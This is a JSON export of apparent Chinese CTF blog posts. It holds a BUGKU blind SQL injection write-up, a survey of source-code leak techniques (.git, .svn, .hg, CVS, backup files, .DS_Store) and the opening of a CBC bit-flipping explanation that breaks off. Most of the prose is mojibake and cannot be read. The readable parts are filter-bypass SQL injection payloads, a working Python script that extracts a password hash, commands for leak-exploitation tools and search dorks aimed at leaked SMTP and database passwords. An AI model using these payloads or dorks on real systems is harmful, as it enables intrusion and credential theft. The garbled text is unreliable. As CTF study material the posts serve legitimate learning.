{"posts":[{"title":"BUGKU WEB36","text":"è¿™å…³å¯ä»¥è¯´çš„ä¸œè¥¿è¿˜æŒºå¤šï¼Œæ¶‰åŠç›²æ³¨ï¼Œä»¥åŠæœ‰å…³æ•°æ®åº“ä¸€äº›æ•°æ®è½¬åŒ–ï¼Œè¿˜æœ‰ç›²æ³¨è„šæœ¬çš„ç¼–å†™ï¼Œæ‰€ä»¥å•ç‹¬æ‹¿å‡ºæ¥è®²ä¸€ä¸‹ã€‚ æ”¶é›†ä¿¡æ¯æ‰“å¼€é¡µé¢åï¼Œå‘ç°åªæœ‰ä¸€ä¸ªç™»å½•æ¡†ï¼Œæƒ³çš„å°±æ˜¯SQLæ³¨å…¥ï¼Œåœ¨å°è¯•äº†å‡ ç§å†™æ³•ï¼Œä»¥åŠåˆ©ç”¨sqlmapè·‘åï¼Œæ²¡å•¥æ”¶è·ï¼Œå› ä¸ºä¸çŸ¥é“è¿‡æ»¤äº†ä»€ä¹ˆï¼Œæ¥ä¸‹æ¥æ‰«äº†ä¸€ä¸‹URLï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰åå°å¯ä»¥æä¾›å…¶ä»–ä¿¡æ¯æ‰«åˆ°äº†ä¸€ä¸ªimageï¼Œæ‰“å¼€ä»¥åï¼Œå¾—åˆ°è¿™å¼ å›¾ç‰‡ï¼Œæ„Ÿè§‰è¿˜æ˜¯è¦SQLæ³¨å…¥â€˜-(mid((passwd)from(-1))=â€™tâ€™)-â€˜ fuzzæµ‹è¯•è¿‡æ»¤å†…å®¹åˆ©ç”¨burpè¿›è¡Œfuzzæµ‹è¯•çœ‹ä¸€ä¸‹éƒ½æœ‰å“ªäº›å­—ç¬¦è¢«è¿‡æ»¤äº†ä¸€å¼€å§‹çš„æ—¶å€™æ„é€ äº†ä¸€ä¸ªadmin'+ 1'1å»è·‘å­—å…¸ï¼Œæ›¿æ¢çš„æ˜¯é‚£ä¸ª+å·å‘ç°ä¸ç®¡ä»€ä¹ˆå­—ç¬¦éƒ½è¢«è¿‡æ»¤äº†çš„æ ·å­ï¼Œç„¶åæƒ³äº†ä¸€ä¸‹ï¼Œä¼šä¸ä¼šæ˜¯ç©ºæ ¼è¢«è¿‡æ»¤äº†å‘€ï¼Ÿï¼Ÿï¼Œç„¶åä½¿ç”¨äº†adminâ€™ 1â€™1 æœç„¶æ˜¯è¿™æ ·ï¼Œå•å¼•å·æ²¡è¢«è¿‡æ»¤ï¼Œä½†æ˜¯ç©ºæ ¼è¢«è¿‡æ»¤äº†ï¼Œæ¥ä¸‹æ¥åœ¨ç”¨ç©ºæ ¼è·‘ä¸€éå­—å…¸è¯•è¯• å‘ç°è¿˜æ˜¯æœ‰ä¸€äº›æ²¡è¿‡æ»¤çš„ï¼Œæ¯”å¦‚è¯´ascii select mid ï¼Œè¿˜æœ‰ä¸€äº›å­—ç¬¦ï¼Œè€Œä¸”ï¼Œæç¤ºçš„é‚£äº›å­—ç¬¦æ˜¯æ²¡è¿‡æ»¤çš„ï¼Œè§£é¢˜æ–¹å‘å¤§æ¦‚ç‡å°±æ˜¯ç›²æ³¨äº†ï¼Œåº”è¯¥å°±æ˜¯è¦ç¼–å†™è„šæœ¬ï¼Œé‚£ä¹ˆæˆ‘ä»¬çŸ¥é“ç¼–å†™è„šæœ¬ï¼Œéœ€è¦çŸ¥é“æ¡ä»¶ï¼Œæ„é€ è¯­å¥ç­‰ç­‰ï¼Œæ‰€ä»¥ç»§ç»­æ„é€ SQLæ³¨å…¥æ¢ç´¢çœ‹çœ‹ åˆ©ç”¨ç°æœ‰å­—ç¬¦æ„é€ æ³¨å…¥è¯­å¥åœ¨ç»§ç»­SQLæ³¨å…¥çš„æ—¶å€™å‘ç°ï¼Œå¦‚æœé—­åˆå¼•å·ï¼Œæœ‰ä¸¤ç§ä¸åŒæƒ…å†µ:1.ä¸€ç§æ˜¯2.å¦ä¸€ç§æ˜¯ æ„å‘³ç€ä»€ä¹ˆå‘¢ï¼špasswordæ„å‘³ç€ä¸å­˜åœ¨è¯¥è´¦å·usernameæ„å‘³ç€å­˜åœ¨è¯¥è´¦å·ä¸ºä»€ä¹ˆå‘¢ï¼Ÿç»§ç»­çœ‹ä¸‹é¢ è¿™é‡ŒæŸ¥æ‰¾äº†ä¸€ä¸‹ç½‘ä¸Šå¤§ç¥ä»¬çš„write upï¼Œå‘ç°è¿™é‡Œé—­åˆå¼•å·çš„æ–¹å¼ä½¿ç”¨å‡å·é—­åˆçš„ï¼Œå…¶å®ä¸æ˜¯å¾ˆèƒ½ç†è§£ä¸ºå•¥ï¼Ÿç­‰æ‰¾åˆ°ç­”å¤å†å›æ¥è¡¥å§é—®å®Œå­¦é•¿ä»¥åå‘ç°æ˜¯è¿™æ ·çš„ï¼šå…¶å®é‚£ä¸ªå‡å·èµ·çš„ä¸æ˜¯é—­åˆä½œç”¨ï¼Œæˆ‘ä»¬é—­åˆå°±æ˜¯ç”¨å•å¼•å·é—­åˆäº†ï¼Œæ€»ç»“ä¸‹æ¥å°±æ˜¯ä¸¤ç‚¹:1.åé¢çš„è´Ÿå·èµ·çš„ä¸æ˜¯é—­åˆå¼•å·çš„ä½œç”¨ï¼Œè€Œæ˜¯ä»¥è¿ç®—ä¸ºåª’ä»‹çš„è¿æ¥ä½œç”¨2.ä¸ºä»€ä¹ˆéœ€è¦è¿™ä¸ªè´Ÿå·ï¼Œæ˜¯å› ä¸ºå¦‚æœç¼ºå°‘è¿™ä¸ªè´Ÿå·ï¼Œæˆ‘ä»¬æƒ³è¾“å…¥çš„æŸ¥è¯¢æ•´ä½“å°±ä¼šè¢«åˆ†å‰²3.é‚£å…¶å®å°±æ˜¯è¯´è¿™ä¸ªè´Ÿå·å¯ä»¥æ›´æ¢ä»»æ„å…¶ä»–çš„è¿ç®—ç¬¦ æ€»è€Œè¨€ä¹‹ï¼Œè¿™é‡Œçš„payloadï¼Œå¯ä»¥æš‚æ—¶å†™ä¸º: 1admin'-0-' æˆ‘åœ¨ä½¿ç”¨ è¿™é‡Œéœ€è¦å¼•å…¥ä¸€ä¸ªçŸ¥è¯†ç‚¹: å°±æ˜¯ä¸Šé¢è¿™ä¸ªusername=0ï¼Œæ‰€æœ‰æ•°æ®éƒ½å‡ºæ¥çš„åŸå› ï¼Œå› ä¸ºè¿™ä¸ªé‡Œçš„usernameå®šä¹‰ä¸ºå­—ç¬¦ä¸²ï¼Œå½“é‡åˆ°intç±»å‹çš„æ•°æ®çš„æ—¶å€™ï¼Œå­—ç¬¦ä¸²ä¼šè‡ªåŠ¨è½¬åŒ–ä¸ºintç±»å‹å’Œè¿™ä¸ª0å»åŒ¹é…ï¼Œè€Œè½¬åŒ–ä¸ºintç±»å‹ä»¥åçš„æ•°æ®ä¸º0æ‰€ä»¥ï¼Œæ‰€æœ‰ä¸ºéƒ½ä¸ºå­—ç¬¦ç»„æˆçš„å­—ç¬¦ä¸²å°±éƒ½å’Œè¿™ä¸ª0åŒ¹é…ï¼Œæ‰€ä»¥å…¨éƒ½ç½—åˆ—å‡ºæ¥äº†å‚è€ƒ:https://stackoverflow.com/questions/18883213/why-select-from-table-where-username-0-shows-all-rows-username-column-is-vhttps://blog.csdn.net/HaHa_Sir/article/details/93666147 SQLæ³¨å…¥è¯­å¥æ„é€ æ¥ä¸‹æ¥å°±æ˜¯æ„é€ ç›²æ³¨è¯­å¥ï¼Œè¿™é‡Œæˆ‘ä»¬éœ€è¦è€ƒè™‘ï¼Œæƒ³è¦è·å–çš„æ—¶å€™ä»€ä¹ˆæ ¹æ®ä¸Šé¢é‚£å¼ å›¾ç‰‡ç»™çš„æç¤ºï¼Œå¤§æ¦‚è¯­å¥æ˜¯(mid((å­—æ®µå)from(i)))=â€™j;è¿™ä¸ªæ—¶å€™é—®é¢˜æ¥äº†ï¼Œå­—æ®µåæ˜¯å•¥ï¼Œçœ‹äº†ä¸€ä¸‹ç½‘ä¸Šå¤§ç¥è¯´çš„ï¼Œæ ¹æ®è¡¨å•æäº¤çš„æ˜¯passwdæ‰€ä»¥çŒœæµ‹æ˜¯passwdï¼Œè¿™ä¸ªå’Œæ•°æ®åº“ä¸­çš„å­—æ®µåæ˜¯ä¸ä¸€æ ·çš„ï¼Œå°±æ˜¯çŒœæµ‹ï¼Œæ¥ä¸‹æ¥å°±æ˜¯è„šæœ¬çš„ç¼–å†™äº†ï¼Œ é¦–å…ˆæ˜¯mid()å‡½æ•°:mid(â€˜å¯¹è±¡â€™ï¼Œå¼€å§‹ä½ç½®ï¼ˆä»1å¼€å§‹ï¼‰ï¼Œé•¿åº¦);ä½†æ˜¯åœ¨è¿™é¢˜ä¸­ï¼Œé€—å·ä¹Ÿè¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥è¿™æ ·å†™æ˜¯è¡Œä¸é€šçš„ï¼Œæ ¹æ®æç¤ºï¼Œæˆ‘ä»¬éœ€è¦åˆ©ç”¨from: æ„å»ºä»¥ä¸‹payloadï¼Œå¦‚æœmidä¸ºçœŸåˆ™ä¸º1ï¼Œé‚£ä¹ˆadmin-1å°±ä¸ä¸º0ï¼Œé‚£ä¹ˆå°±ä¸ä¼šæŸ¥è¯¢å¾—å‡º 1admin'-(mid((passwd)from(-1))&gt;'0')-' åœ¨è¿™é‡Œï¼Œå¦‚æœmidè¿™é‡Œä¸ºçœŸåˆ™ä¸º1ï¼Œæˆ‘ä»¬çŸ¥é“adminâ€™-1-â€˜åœ¨æ•°æ®åº“æŸ¥è¯¢ä¸ºç©ºï¼Œå³ä¸ºusername wrongï¼Œåä¹‹åŒç† å‚è€ƒï¼šhttps://xz.aliyun.com/t/2583æ¥ä¸‹æ¥æ˜¯å†™postç±»å‹çš„è„šæœ¬: ç›´æ¥è´´å‡ºæ¥å§ è¿™é‡Œæœ‰å¿…è¦è¯´å‡ ä¸ªç»†èŠ‚1.ç½‘é¡µçš„URLæœ‰ä¸¤ä¸ª ä¸€ä¸ªindex.phpï¼Œå°±æ˜¯æ¡†æ¡†é‚£è¾¹ï¼Œå¦ä¸€ä¸ªæ˜¯login.phpï¼Œè¿™ä¸ªæ‰æ˜¯å›æ˜¾çš„é¡µé¢ï¼Œæ‰€ä»¥ä½ è¦å‘é€poståˆ°è¿™ä¸ªé¡µé¢å»2.è¿™é‡Œæˆ‘ç”¨äº†ä¸¤æ¬¡é€†åºï¼Œå› ä¸ºmidåªèƒ½ä»åé¢æˆªå–ï¼Œæ‰€ä»¥ç”¨äº†åˆ‡ç‰‡æ³•è¿›è¡Œé€†åº 123456789101112131415161718192021import requestss=requests.session()url = &quot;http://114.67.246.176:11969/login.php&quot;headers = {'Cookie': 'PHPSESSID=34kfhvoilevqk4p779t36qc2j5'}password = &quot;&quot;for i in range(1,33): for j in '0123456789abcdef': payload =f&quot;admin'-(mid((passwd)from(-{i}))='{j}{password}')-'&quot; print(payload) data = {'uname': payload,'passwd': 'sky'} # print(s.post(url,data=data).text) if 'username error!!' in s.post(url=url,data=data,headers=headers).text: #print(s.post(url,data=data).text) strA = password password = strA[::-1] print(password)#å¯ä¸ç”¨ï¼Œæ˜¯ç”¨æ¥è°ƒè¯•çš„ password += j strA = password password = strA[::-1] print(password) break å¾—åˆ°ç»“æœä»¥åå‘ç°æ˜¯md5åŠ å¯†ï¼Œæ‹¿å»è§£å¯†ï¼Œå¾—åˆ°bugkuctfï¼Œç„¶åç™»é™†ä¸€ä¸‹ï¼Œä»–è¯´ è¿™è¾¹è¯´è¦lså‘½ä»¤ï¼ŸæŸ¥äº†ä¸€ä¸‹å…¶å®å¯ä»¥ç”¨catLinux catå‘½ä»¤catå‘½ä»¤:å‘½ä»¤ç”¨äºè¿æ¥æ–‡ä»¶å¹¶æ‰“å°åˆ°æ ‡å‡†è¾“å‡ºè®¾å¤‡ä¸Šã€‚ cat&gt;/filenamehttps://www.runoob.com/linux/linux-comm-cat.htmlhttp://blog.sina.com.cn/s/blog_52f6ead0010127xm.html å°ç»“ï¼šæ„Ÿè§‰ä»è¿™å…³å­¦åˆ°äº†æŒºå¤šä¸œè¥¿çš„:1.å¯¹äºç›²æ³¨çš„ç†è§£æ›´æ·±äº†ï¼Œæ¯”å¦‚å¦‚ä½•å»æ„é€ é—­åˆè¯­å¥2.mysqlä¸€äº›æ›´åŸºç¡€çš„ä¸œè¥¿3.è„šæœ¬çš„ç¼–å†™ä¹Ÿæ›´åŠ å¾—å¿ƒåº”æ‰‹äº†ï¼Œå› ä¸ºå…¶å®æ¨¡æ¿éƒ½ä¸€æ ·4.ä¿¡æ¯æ”¶é›†çš„é‡è¦æ€§â€”â€”ç›²æ³¨è¯­å¥çš„ç¼–å†™ï¼Œ,è¿‡æ»¤äº†ä»€ä¹ˆ5.ä¸€äº›ç»†èŠ‚è¦æ³¨æ„å“‡ï¼ï¼ï¼","link":"/2021/02/01/BUGKU-WEB36/"},{"title":"CTFä¸­å¸¸è§æºç æ³„éœ²","text":"SVNæºç æ³„éœ²SVNï¼ˆsubversionï¼‰æ˜¯æºä»£ç ç‰ˆæœ¬ç®¡ç†è½¯ä»¶ï¼Œé€ æˆSVNæºä»£ç æ¼æ´çš„ä¸»è¦åŸå› æ˜¯ç®¡ç†å‘˜æ“ä½œä¸è§„èŒƒã€‚â€œåœ¨ä½¿ç”¨SVNç®¡ç†æœ¬åœ°ä»£ç è¿‡ç¨‹ä¸­ï¼Œä¼šè‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªåä¸º.svnçš„éšè—æ–‡ä»¶å¤¹ï¼Œå…¶ä¸­åŒ…å«é‡è¦çš„æºä»£ç ä¿¡æ¯ã€‚ä½†ä¸€äº›ç½‘ç«™ç®¡ç†å‘˜åœ¨å‘å¸ƒä»£ç æ—¶ï¼Œä¸æ„¿æ„ä½¿ç”¨â€˜å¯¼å‡ºâ€™åŠŸèƒ½ï¼Œè€Œæ˜¯ç›´æ¥å¤åˆ¶ä»£ç æ–‡ä»¶å¤¹åˆ°WEBæœåŠ¡å™¨ä¸Šï¼Œè¿™å°±ä½¿.svnéšè—æ–‡ä»¶å¤¹è¢«æš´éœ²äºå¤–ç½‘ç¯å¢ƒï¼Œé»‘å®¢å¯ä»¥å€ŸåŠ©å…¶ä¸­åŒ…å«çš„ç”¨äºç‰ˆæœ¬ä¿¡æ¯è¿½è¸ªçš„â€˜entriesâ€™æ–‡ä»¶ï¼Œé€æ­¥æ‘¸æ¸…ç«™ç‚¹ç»“æ„ã€‚â€ï¼ˆå¯ä»¥åˆ©ç”¨.svn/entriesæ–‡ä»¶ï¼Œè·å–åˆ°æœåŠ¡å™¨æºç ã€svnæœåŠ¡å™¨è´¦å·å¯†ç ç­‰ä¿¡æ¯ï¼‰ æ›´ä¸¥é‡çš„é—®é¢˜åœ¨äºï¼ŒSVNäº§ç”Ÿçš„.svnç›®å½•ä¸‹è¿˜åŒ…å«äº†ä»¥.svn-baseç»“å°¾çš„æºä»£ç æ–‡ä»¶å‰¯æœ¬ï¼ˆä½ç‰ˆæœ¬SVNå…·ä½“è·¯å¾„ä¸ºtext-baseç›®å½•ï¼Œé«˜ç‰ˆæœ¬SVNä¸ºpristineç›®å½•ï¼‰ï¼Œå¦‚æœæœåŠ¡å™¨æ²¡æœ‰å¯¹æ­¤ç±»åç¼€åšè§£æï¼Œé»‘å®¢åˆ™å¯ä»¥ç›´æ¥è·å¾—æ–‡ä»¶æºä»£ç ã€‚ åˆ©ç”¨å·¥å…·SvnHack gitæºç æ³„éœ²Gitæ˜¯ä¸€ä¸ªå¼€æºçš„åˆ†å¸ƒå¼ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿï¼Œåœ¨æ‰§è¡Œgit initåˆå§‹åŒ–ç›®å½•çš„æ—¶å€™ï¼Œä¼šåœ¨å½“å‰ç›®å½•ä¸‹è‡ªåŠ¨åˆ›å»ºä¸€ä¸ª.gitç›®å½•ï¼Œç”¨æ¥è®°å½•ä»£ç çš„å˜æ›´è®°å½•ç­‰ã€‚å‘å¸ƒä»£ç çš„æ—¶å€™ï¼Œå¦‚æœæ²¡æœ‰æŠŠ.gitè¿™ä¸ªç›®å½•åˆ é™¤ï¼Œå°±ç›´æ¥å‘å¸ƒåˆ°äº†æœåŠ¡å™¨ä¸Šï¼Œæ”»å‡»è€…å°±å¯ä»¥é€šè¿‡å®ƒæ¥æ¢å¤æºä»£ç ã€‚ åˆ©ç”¨å·¥å…·GitHackpy -2.7 GitHack.py -u hgæºç æ³„éœ²Mercurial æ˜¯ä¸€ç§è½»é‡çº§åˆ†å¸ƒå¼ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿï¼Œä½¿ç”¨ hg initçš„æ—¶å€™ä¼šç”Ÿæˆ.hgæ–‡ä»¶ åˆ©ç”¨éœ€è¦perlgithubé¡¹ç›®åœ°å€ï¼šhttps://github.com/kost/dvcs-ripper perl rip-hg.pl -v -u url cvsæ¼æ´æ³„éœ²CVSæ˜¯ä¸€ä¸ªC/Sç³»ç»Ÿï¼Œæ˜¯ä¸€ä¸ªå¸¸ç”¨çš„ä»£ç ç‰ˆæœ¬æ§åˆ¶è½¯ä»¶ã€‚ä¸»è¦åœ¨å¼€æºè½¯ä»¶ç®¡ç†ä¸­ä½¿ç”¨ã€‚ä¸å®ƒç›¸ç±»ä¼¼çš„ä»£ç ç‰ˆæœ¬æ§åˆ¶è½¯ä»¶æœ‰subversionã€‚å¤šä¸ªå¼€å‘äººå‘˜é€šè¿‡ä¸€ä¸ªä¸­å¿ƒç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿæ¥è®°å½•æ–‡ä»¶ç‰ˆæœ¬ï¼Œä»è€Œè¾¾åˆ°ä¿è¯æ–‡ä»¶åŒæ­¥çš„ç›®çš„ã€‚CVSç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿæ˜¯ä¸€ç§GNUè½¯ä»¶åŒ…ï¼Œä¸»è¦ç”¨äºåœ¨å¤šäººå¼€å‘ç¯å¢ƒä¸‹çš„æºç çš„ç»´æŠ¤ã€‚ä½†æ˜¯ç”±äºä¹‹å‰CVSç¼–ç çš„é—®é¢˜ï¼Œå¤§å¤šæ•°è½¯ä»¶å¼€å‘å…¬å¸éƒ½ä½¿ç”¨SVNæ›¿ä»£äº†CVSã€‚ä¸»è¦æ˜¯é’ˆå¯¹ CVS/Rootä»¥åŠCVS/Entriesç›®å½•ï¼Œç›´æ¥å°±å¯ä»¥çœ‹åˆ°æ³„éœ²çš„ä¿¡æ¯ã€‚http://url/CVS/Root è¿”å›æ ¹ä¿¡æ¯http://url/CVS/Entries è¿”å›æ‰€æœ‰æ–‡ä»¶çš„ç»“æ„ åˆ©ç”¨githubé¡¹ç›®åœ°å€ï¼šhttps://github.com/kost/dvcs-ripper.git è¿è¡Œç¤ºä¾‹: perl rip-cvs.pl -v -u http://www.example.com/CVS/ Bazaar/bzræ³„éœ²åŸç†Bazaarï¼ˆbzrï¼‰æ˜¯å¦ä¸€ä¸ªå¼€æºçš„ DVCSï¼ˆDistributed Version Control Systemï¼Œå³åˆ†å¸ƒå¼ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿï¼‰ï¼Œå®ƒè¯•å›¾ç»™ SCMï¼ˆSource Code Managementï¼Œå³æºç ç®¡ç†ï¼‰ çš„ä¸–ç•Œé‡Œå¸¦æ¥ä¸€äº›æ–°çš„ä¸œè¥¿ã€‚ bzr æ˜¯ Canonical å…¬å¸æ”¯æŒçš„ä¸€ä¸ªé¡¹ç›®ï¼Œä¹Ÿå°±æ˜¯ Ubuntu Linux çš„å‘è¡Œå…¬å¸ã€‚ç®€å•æ¥è¯´ï¼Œbzr æ˜¯ç”¨ python ç¼–å†™çš„ï¼Œç”¨äºç‰ˆæœ¬æ§åˆ¶ã€‚ åˆ©ç”¨perl rip-bzr.pl -v -u http://www.example.com/.bzr/ ç½‘ç«™å¤‡ä»½å‹ç¼©æ–‡ä»¶ç®¡ç†å‘˜å°†ç½‘ç«™æºä»£ç å¤‡ä»½åœ¨Webç›®å½•ä¸‹ï¼Œæ”»å‡»è€…é€šè¿‡çŒœè§£æ–‡ä»¶è·¯å¾„ï¼Œä¸‹è½½å¤‡ä»½æ–‡ä»¶ï¼Œå¯¼è‡´æºä»£ç æ³„éœ²ã€‚ å¸¸è§å¤‡ä»½æ–‡ä»¶åç¼€.index.php.swpindex.php.swpindex.php.bak.index.php~index.php.bak_Edietplusindex.php.~index.php.~1~index.phpindex.php~index.php.rarindex.php.zipindex.php.7zindex.php.tar.gz.index.php.swowww.zipwww.rarwww.zipwww.7zwww.tar.gzwww.tarweb.zipweb.rarweb.zipweb.7zweb.tar.gzweb.tarwwwroot.rarweb.rarimage.php.bak WEB-INF/web.xml æ³„éœ²WEB-INFæ˜¯Javaçš„WEBåº”ç”¨çš„å®‰å…¨ç›®å½•ï¼Œå¦‚æœæƒ³åœ¨é¡µé¢ä¸­ç›´æ¥è®¿é—®å…¶ä¸­çš„æ–‡ä»¶ï¼Œå¿…é¡»é€šè¿‡web.xmlæ–‡ä»¶å¯¹è¦è®¿é—®çš„æ–‡ä»¶è¿›è¡Œç›¸åº”æ˜ å°„æ‰èƒ½è®¿é—®ã€‚ WEB-INF ä¸»è¦åŒ…å«ä¸€ä¸‹æ–‡ä»¶æˆ–ç›®å½•ï¼š WEB-INF/web.xml : Webåº”ç”¨ç¨‹åºé…ç½®æ–‡ä»¶, æè¿°äº†servletå’Œå…¶ä»–çš„åº”ç”¨ç»„ä»¶é…ç½®åŠå‘½åè§„åˆ™.WEB-INF/database.properties : æ•°æ®åº“é…ç½®æ–‡ä»¶WEB-INF/classes/ : ä¸€èˆ¬ç”¨æ¥å­˜æ”¾Javaç±»æ–‡ä»¶(.class)WEB-INF/lib/ : ç”¨æ¥å­˜æ”¾æ‰“åŒ…å¥½çš„åº“(.jar)WEB-INF/src/ : ç”¨æ¥æ”¾æºä»£ç (.aspå’Œ.phpç­‰) é€šè¿‡æ‰¾åˆ° web.xml æ–‡ä»¶ï¼Œæ¨æ–­ class æ–‡ä»¶çš„è·¯å¾„ï¼Œæœ€åç›´æ¥ class æ–‡ä»¶ï¼Œå†é€šè¿‡åç¼–è¯‘ class æ–‡ä»¶ï¼Œå¾—åˆ°ç½‘ç«™æºç ã€‚ SWP æ–‡ä»¶æ³„éœ²swpå³swapæ–‡ä»¶ï¼Œåœ¨ç¼–è¾‘æ–‡ä»¶æ—¶äº§ç”Ÿçš„ä¸´æ—¶æ–‡ä»¶ï¼Œå®ƒæ˜¯éšè—æ–‡ä»¶ï¼Œå¦‚æœç¨‹åºæ­£å¸¸é€€å‡ºï¼Œä¸´æ—¶æ–‡ä»¶è‡ªåŠ¨åˆ é™¤ï¼Œå¦‚æœæ„å¤–é€€å‡ºå°±ä¼šä¿ç•™ï¼Œæ–‡ä»¶åä¸º .filename.swpã€‚ æ¼æ´åˆ©ç”¨ï¼šç›´æ¥è®¿é—®.swpæ–‡ä»¶ï¼Œä¸‹è½½å›æ¥ååˆ æ‰æœ«å°¾çš„.swpï¼Œè·å¾—æºç æ–‡ä»¶ã€‚ githubæºç æ³„éœ²GitHubæ˜¯ä¸€ä¸ªé¢å‘å¼€æºåŠç§æœ‰è½¯ä»¶é¡¹ç›®çš„æ‰˜ç®¡å¹³å°ï¼Œå¾ˆå¤šäººå–œæ¬¢æŠŠè‡ªå·±çš„ä»£ç ä¸Šä¼ åˆ°å¹³å°æ‰˜ç®¡ã€‚æ”»å‡»è€…é€šè¿‡å…³é”®è¯è¿›è¡Œæœç´¢ï¼Œå¯ä»¥æ‰¾åˆ°å…³äºç›®æ ‡ç«™ç‚¹çš„æ•æ„Ÿä¿¡æ¯ï¼Œç”šè‡³å¯ä»¥ä¸‹è½½ç½‘ç«™æºç ã€‚ githubå¸¸è§æœç´¢è¯­æ³•in:name test #ä»“åº“æ ‡é¢˜æœç´¢å«æœ‰å…³é”®å­— SpringCloudin:descripton test #ä»“åº“æè¿°æœç´¢å«æœ‰å…³é”®å­—in:readme test #Readmeæ–‡ä»¶æœç´ å«æœ‰å…³é”®å­—stars:&gt;3000 test #starsæ•°é‡å¤§äº3000çš„æœç´¢å…³é”®å­—stars:1000..3000 test #starsæ•°é‡å¤§äº1000å°äº3000çš„æœç´¢å…³é”®å­—forks:&gt;1000 test #forksæ•°é‡å¤§äº1000çš„æœç´¢å…³é”®å­—forks:1000..3000 test #forksæ•°é‡å¤§äº1000å°äº3000çš„æœç´¢å…³é”®å­—size:&gt;=5000 test #æŒ‡å®šä»“åº“å¤§äº5000k(5M)çš„æœç´¢å…³é”®å­—pushed:&gt;2019-02-12 test #å‘å¸ƒæ—¶é—´å¤§äº2019-02-12çš„æœç´¢å…³é”®å­—created:&gt;2019-02-12 test #åˆ›å»ºæ—¶é—´å¤§äº2019-02-12çš„æœç´¢å…³é”®å­—user:test #ç”¨æˆ·åæœç´ license:apache-2.0 test #æ˜ç¡®ä»“åº“çš„ LICENSE æœç´¢å…³é”®å­—language:java test #åœ¨javaè¯­è¨€çš„ä»£ç ä¸­æœç´¢å…³é”®å­—user:test in:name test #ç»„åˆæœç´¢,ç”¨æˆ·åtestçš„æ ‡é¢˜å«æœ‰testçš„ Googleé‚®ç®±æœç´¢ä½¿ç”¨ Github è¿›è¡Œé‚®ä»¶é…ç½®ä¿¡æ¯æ”¶é›† å¾ˆå¤šç½‘ç«™åŠç³»ç»Ÿéƒ½ä¼šä½¿ç”¨ pop3 å’Œ smtp å‘é€æ¥é‚®ä»¶ï¼Œä¸å°‘å¼€å‘è€…ç”±äºå®‰å…¨æ„è¯†ä¸è¶³ä¼šæŠŠç›¸å…³çš„é…ç½®ä¿¡æ¯ä¹Ÿæ”¾åˆ°Githubä¸Šï¼Œæ‰€ä»¥å¦‚ æœè¿™æ—¶å€™æˆ‘ä»¬åŠ¨ç”¨ä¸€ä¸‹googleæœç´¢å‘½ä»¤è¯­å¥ï¼Œæ„é€ ä¸€ä¸‹å…³é”®å­—ï¼Œå°±èƒ½æŠŠè¿™äº›ä¿¡æ¯ç»™æ‰¾å‡ºæ¥äº†ã€‚ site:Github.com smtp site:Github.com smtp @qq.com site:Github.com smtp @126.com site:Github.com smtp @163.com site:Github.com smtp @sina.com.cnsite:Github.com smtp passwordsite:Github.com String password smtp æ•°æ®åº“ä¿¡æ¯æœé›†site:Github.com sa password site:Github.com root password site:Github.com User ID=â€™saâ€™;Password site:Github.com inurl:sql .DS_Storeæ³„éœ².DS_Store æ–‡ä»¶åˆ©ç”¨ .DS_Store æ˜¯ Mac OS ä¿å­˜æ–‡ä»¶å¤¹çš„è‡ªå®šä¹‰å±æ€§çš„éšè—æ–‡ä»¶ã€‚é€šè¿‡.DS_Storeå¯ä»¥çŸ¥é“è¿™ä¸ªç›®å½•é‡Œé¢æ‰€æœ‰æ–‡ä»¶çš„æ¸…å•ã€‚ åˆ©ç”¨githubé¡¹ç›®åœ°å€:https://github.com/lijiejie/ds_store_expä½¿ç”¨ä¸‹è½½åï¼Œè¿›å…¥ç›®å½•æ›´æ–°python2åº“ pip install -r requirements.txtpython ds_store_exp.py http://6974-59fce729-40f6-4124-a2c9-a5a66673dc66node3.buuoj.cn:28261/.DS_Store å‚è€ƒï¼šhttps://www.cnblogs.com/Lmg66/p/13598803.html","link":"/2021/02/09/CTF%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/"},{"title":"CBCå­—èŠ‚ç¿»è½¬æ”»å‡»","text":"CBCåŠ å¯†æµç¨‹é¦–å…ˆå°†æ˜æ–‡åˆ†ç»„ï¼Œå¸¸è§çš„ä»¥16ä¸ªå­—èŠ‚ä¸ºä¸€ç»„ï¼Œä½æ•°ä¸è¶³çš„ä½¿ç”¨ç‰¹æ®Šå­—ç¬¦å¡«å……â€”â€”&gt;ç”Ÿæˆä¸€ä¸ªéšæœºçš„åˆå§‹åŒ–å‘é‡(IV)å’Œä¸€ä¸ªå¯†é’¥â€”â€”&gt;å°†IVå’Œç¬¬ä¸€ç»„æ˜æ–‡å¼‚æˆ–â€”â€”&gt;ç”¨å¯†é’¥å¯¹3ä¸­XORåäº§ç”Ÿçš„å¯†æ–‡åŠ å¯†â€”â€”&gt;ç”¨4ä¸­äº§ç”Ÿçš„å¯†æ–‡å¯¹ç¬¬äºŒç»„æ˜æ–‡è¿›è¡ŒXORæ“ä½œâ€”â€”&gt;ç”¨å¯†é’¥å¯¹5ä¸­äº§ç”Ÿçš„å¯†æ–‡åŠ å¯†â€”â€”&gt;cé‡å¤æ­¥éª¤4-7ï¼Œåˆ°æœ€åä¸€ç»„æ˜æ–‡â€”â€”&gt;å°†IVå’ŒåŠ å¯†åçš„å¯†æ–‡æ‹¼æ¥åœ¨ä¸€èµ·ï¼Œå¾—åˆ°æœ€ç»ˆçš„å¯†æ–‡ã€‚ Plaintextï¼šå¾…åŠ å¯†çš„æ•°æ®â€”â€”ä¹Ÿå°±æ˜¯æ˜æ–‡ IVï¼šåˆå§‹åŒ–å‘é‡ï¼Œç”¨äºéšæœºåŒ–åŠ å¯†çš„æ¯”ç‰¹å—ï¼Œä¿è¯å³ä½¿å¯¹ç›¸åŒæ˜æ–‡å¤šæ¬¡åŠ å¯†ï¼Œä¹Ÿå¯ä»¥å¾—åˆ°ä¸åŒçš„å¯†æ–‡ã€‚ Ciphertextï¼šåŠ å¯†åçš„æ•°æ®â€”â€”ä¹Ÿå°±æ˜¯å¯†æ–‡ Keyï¼šå¯†é’¥ CBCè§£å¯†è¿‡ç¨‹ 